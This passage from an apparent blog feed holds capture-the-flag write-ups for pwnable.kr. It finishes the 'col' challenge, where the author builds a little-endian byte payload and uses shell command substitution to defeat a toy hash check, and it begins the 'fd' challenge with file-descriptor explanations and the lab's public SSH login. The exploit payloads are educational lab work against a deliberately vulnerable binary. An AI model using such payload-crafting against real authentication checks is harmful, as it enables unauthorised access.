&lt;p&gt;In other words, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; must have four 4 bytes strings with value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6C5CEC8&lt;/code&gt; collided with one 4 bytes integer with value &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6C5CECC&lt;/code&gt;. This will sum up to a 20 bytes integer and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_password&lt;/code&gt; will evaluate it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The only thing left to be done here is to successfully find a way to represent the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; as a 20 byte integer that will be converted the way we calculated.&lt;/p&gt;

&lt;h3 id=&quot;-considerations&quot;&gt;&lt;a href=&quot;#considerations-step2&quot;&gt;&lt;/a&gt; Considerations&lt;/h3&gt;

&lt;p&gt;It is important to consider here the endianess - byte order - used by the system. The endianess refers to the order in which bytes are stored for multi-byte data types like integers in memory. There are two types of endianess:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Little endian&lt;/strong&gt;: in little endian systems, the least significant byte (LSB) of a word is stored at the smallest memory address, and the most significant byte (MSB) is stored at the highest address. For example, the hexadecimal value $0\text{x12345678}$ will be stored in memory as 78, 65, 43, and 21.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Big endian&lt;/strong&gt;: in big endien systems, the LSB of a word is stored at the highest memory address, and the MSB is stored at the smallest address. For example, the same hexadecimal value $0\text{x12345678}$ will be stored in memory as 12, 34, 56, and 78.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;The first think we have to do is figure out how to write our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;passcode&amp;gt;&lt;/code&gt; such that it is translated to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode&lt;/code&gt; value, represented in our aforementioned calculations. In our local machine, we could write a Python script that does this. Let’s assume little endian here, since most x86 architectures are little endian.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;bytes1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC8\xCE\xC5\x06&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xCC\xCE\xC5\x06&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;passcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Passcode does not meet criteria&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running the code, we assert that the lenght of the passcode is 20 and the result is:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/col &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 col.py 
b&lt;span class=&quot;s1&quot;&gt;&apos;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alright! That seems to be working! But how can we run this directly in the command line instead? I assume we won’t have permissions to write a Python script inside the CTF machine… Let’s check:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@pwnable:~$ python3 -c &quot;print(&apos;hi mom&apos;)&quot;
hi mom
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok, we are able to run a command line Python snippet. Let’s solve this bad boy!&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;I’ve tried a few different approaches before actually finding the write payload. Let’s check what I’ve tried and why it has failed.&lt;/p&gt;

&lt;h3 id=&quot;attempt-1&quot;&gt;Attempt 1&lt;/h3&gt;
&lt;p&gt;My first attempt was to pass a string that had the Python snippet embedded with it. Here is what I got:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./col &lt;span class=&quot;s2&quot;&gt;&quot;python3 -c &apos;print(4 * &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ce&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ce&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06)&apos;&quot;&lt;/span&gt;
passcode length should be 20 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yep. That did not work. I think the problem here is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;col&lt;/code&gt; binary is interpreting all of the payload as my passcode, and not actually running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; command. Let’s move to my second attempt.&lt;/p&gt;

&lt;h3 id=&quot;attempt-2&quot;&gt;Attempt 2&lt;/h3&gt;

&lt;p&gt;Let’s try command substitution, which is basically telling the shell to store the result of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; command into a variable and then pass it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;col&lt;/code&gt;. However, that also did not work:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./col &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print(4 * b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ce&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&apos; + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cc&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ce&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c5&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;06&apos;)&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
passcode length should be 20 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which made me think that the problem was the quotation order. In this payload, I’m using double quotes for two different sets of the payload, which might confuse the shell. Let’s see my third attempt.&lt;/p&gt;

&lt;h3 id=&quot;attempt-3&quot;&gt;Attempt 3&lt;/h3&gt;

&lt;p&gt;My third attempt was trying to use quote escaping as an alternative for one of the pairs of double quotes:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./col &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print(4 * b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;\xc8\xce\xc5\x06&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; + b&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;\xcc\xce\xc5\x06&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;)&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
passcode length should be 20 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, that did not work either.&lt;/p&gt;

&lt;h3 id=&quot;attempt-4&quot;&gt;Attempt 4&lt;/h3&gt;

&lt;p&gt;I was getting tired of counting single, double quotes, and escaped single quotes. Maybe I should take a different approach. Maybe the problem wasn’t the quotation, but the way &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print&lt;/code&gt; function outputs raw bytes.&lt;/p&gt;

&lt;p&gt;So I thought… What if I forced the print to correctly pass the raw bytes using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys.stdout&lt;/code&gt; buffer? Well, let’s see:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;col@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./col &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;import sys; sys.stdout.buffer.write(4 * b&quot;\xc8\xce\xc5\x06&quot;+ b&quot;\xcc\xce\xc5\x06&quot;)&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
daddy! I just managed to create a &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;collision :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It worked! But why? We have the following two answers:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys.stdout.buffer.write&lt;/code&gt; enforces raw bytes to be written directly to stdout descriptor. This avoids any additional characters that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;print&lt;/code&gt; might add.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;We ensured that the entire Python command is enclosed in single quotes, and the byte strings within the Python command are enclosed in double quotes.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Enjoy your Fabre card! This one was harder than the Poring one.&lt;/p&gt;

&lt;h1 id=&quot;-conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt; Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF we learned a lot! Not only we got a bit of taste of what MD5 hash collisions were theoretically, but also got a small environment to practice a way simplified version of this. Although the CTF was not actually related to MD5 hash collision, the concept used to solve it is very similar - but oversimplified - to this much more complex topic.&lt;/p&gt;

&lt;p&gt;We also used a little endian byte order to solve this, which is something to keep in mind. Big endian would not have worked in a x86 architecture, and our guess to use little endian was initially correct!&lt;/p&gt;

&lt;p&gt;Not only that, we also needed to think of different ways of crafting a good payload so that the hexadecimal integers were actually interpreted by the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;col&lt;/code&gt; binary. This shows why persistence and resilience is a mastermind skill to have as a hacker.&lt;/p&gt;

&lt;p&gt;This is exactly what a hacker does: finds its way through. We had the answer, we just needed to find an open window, and down the rabbit hole we go!&lt;/p&gt;

&lt;p&gt;Thanks for sticking until the end. It was a nice ride! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 02 Dec 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000//collision-pwnable</link>
        <link href="http://localhost:4000/collision-pwnable"/>
        <guid isPermaLink="true">http://localhost:4000/collision-pwnable</guid>
      </item>
    
      <item>
        <title>fd - pwnable.kr</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://pwnable.kr&quot;&gt;Pwnable&lt;/a&gt; is a website for cybersecurity enthusiasts willing to challenge themselves by solving different kinds of CTFs. I’ve come across it in one of my lazy YT shorts watching moments, where I found out about someone solving these CTFs. As an enthusiast myself, I thought: well, let’s give it a shot.&lt;/p&gt;

&lt;p&gt;To my surprise, not only did it look pretty fun, but the level tag images are the different Ragnarok Online monsters cards. Ok! You got me here already! As someone with the alias ‘Cecil Daemon’, I felt obligated to start cracking each level.&lt;/p&gt;

&lt;p&gt;This post is about solving the very first level, named ‘fd’. Let’s drop our Poring card!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
&lt;blockquote&gt;
  &lt;p&gt;Mommy! what is a file descriptor in Linux?&lt;/p&gt;

  &lt;p&gt;try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
https://youtu.be/971eZhMHQQw&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;ssh fd@pwnable.kr -p2222 (pw:guest)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Ok, I’ll be spilling some gold here by letting you all know how I approach CTF challenges with a mindset that rarely fails me. First off, I’m not a C/C++ pro developer, but I have my fair share of coding in these languages. However, technical jargon was not always my strength. “&lt;em&gt;What the f*** is a file descriptor&lt;/em&gt;” was my first thought. Little did I know that I knew what it was, but not from its name.&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;Think of it like this: if we don’t know what a file descriptor is, we’d better step back for a moment and learn about it. This is the first step - understanding the problem. In fact, I didn’t learn this doing CTFs.  I learned it while I was pursuing my totally unrelated Master’s Degree in Physics. The word for this is &lt;strong&gt;research&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Research is always your best friend here, and the more we are comfortable at learning stuff, reading documentation and practicing what we’ve learned, the more easily these challenges blossom.&lt;/p&gt;

&lt;h3 id=&quot;what-is-a-file-descriptor&quot;&gt;&lt;a href=&quot;#fd-definition&quot;&gt;&lt;/a&gt;What is a File Descriptor?&lt;/h3&gt;

&lt;p&gt;File Descriptors are, put in simple terms, non-negative integers - more specifically 0, 1 and 2 - that are shorthands for three important concepts: 0 for Standard Input (stdin), 1 for Standard Output (stdout), and 2 for Standard Error (stderr). The table below summarizes what each of these terms mean&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Descriptor name&lt;/th&gt;
      &lt;th&gt;Short name&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descriptor integer&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Standard in&lt;/td&gt;
      &lt;td&gt;stdin&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Input from keyboard&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Standard out&lt;/td&gt;
      &lt;td&gt;stdout&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Output from console&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Standard err&lt;/td&gt;
      &lt;td&gt;stderr&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Error output to the console&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;A simple example in the Linux terminal would be redirecting the descriptors to programs or files. For example, typing a wrong or nonexistent command - like ‘dsasd’ - in the terminal will raise a “command not found” error:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dsasd
bash: dsasd: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, if we redirect our stderr to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;, we should see no error popping up:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dsasd 2&amp;gt;/dev/null
kaizen@celestial ~ :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The same thing is true for our stdout descriptor. Running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; prints all contents in the current directory to our stdout descriptor:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 0
drwxr-xr-x  5 kaizen &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;160 Dec  1 23:39 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxrwxrwt 17 root   root  860 Dec  1 23:39 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file1
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file2
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file3
drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test1
drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test2
drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We could redirect the stdout to a file, so that the output will be saved into it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; 1&amp;gt;stdout
kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;stdout
total 0
drwxr-xr-x  5 kaizen &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;180 Dec  1 23:41 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxrwxrwt 17 root   root  860 Dec  1 23:39 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file1
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file2
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:39 file3
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 kaizen &lt;span class=&quot;nb&quot;&gt;users   &lt;/span&gt;0 Dec  1 23:41 stdout
drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test1
drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test2
drwxr-xr-x  2 kaizen &lt;span class=&quot;nb&quot;&gt;users  &lt;/span&gt;40 Dec  1 23:39 test3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, stdin is exactly what we type into the terminal from our keyboard. An example would be passing input to a command, such as:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/fd &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ls&quot;&lt;/span&gt; | bash
file1  file2  file3  stdout  test1  test2  test3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, our stdin is the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;ls&quot;&lt;/code&gt;, which is being passed to our bash interpreter.&lt;/p&gt;

&lt;h2 id=&quot;-step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt; Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Now that we know what a file descriptor is and how to use it, we can finally start the CTF.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;Tip: It’s good practice to check the CTF challenge before doing the research. In this case, however, since the challenge description mentioned something ‘new’ right from the bat, I decided to take the step back before actually checking the CTF problem. Most of the time, we need to first understand the proposed CTF challenge and then conduct the necessary research.&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To start the CTF, we need to ssh into the machine. This can be done with the command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh fd@pwnable.kr -p2222&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;You will be prompted for the password, which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt;. After successfully connecting to the machine, we can simply run ls -l to see what we have in our home directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fd@pwnable:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
total 16
&lt;span class=&quot;nt&quot;&gt;-r-sr-x---&lt;/span&gt; 1 fd_pwn fd   7322 Jun 11  2014 fd
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root   root  418 Jun 11  2014 fd.c
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 fd_pwn root   50 Jun 11  2014 flag
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that we have a C code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd.c&lt;/code&gt;; a binary file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fd&lt;/code&gt; and a text file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;. Let’s see who we are in the machine:&lt;/p&gt;

